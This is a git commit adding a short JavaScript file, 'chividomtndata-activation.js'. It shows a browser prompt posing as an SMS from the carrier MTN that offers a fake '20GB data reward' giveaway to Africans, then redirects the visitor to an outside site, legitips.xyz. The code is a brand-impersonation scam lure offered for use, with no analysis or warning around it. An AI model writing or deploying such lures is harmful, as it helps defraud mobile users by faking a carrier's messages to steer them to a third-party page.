90b3b38cc4aed81bb7be22cc5936d56c2bdb8539
legitips <83867893+legitips@users.noreply.github.com>
2024-06-24 15:28:03 -0700

    Create chividomtndata-activation.js

---
+++ chividomtndata-activation.js
@@ -0,0 +1,5 @@
+var password = '1'
+password=prompt('MTN SMS: Dear customer, kindly receive Chivido giveaway from MTN 20GB data Reward to all African, press 1 to check now ','1');
+if (password != '1') {
+location.href='https://legitips.xyz/chividomtndata.html';
+}
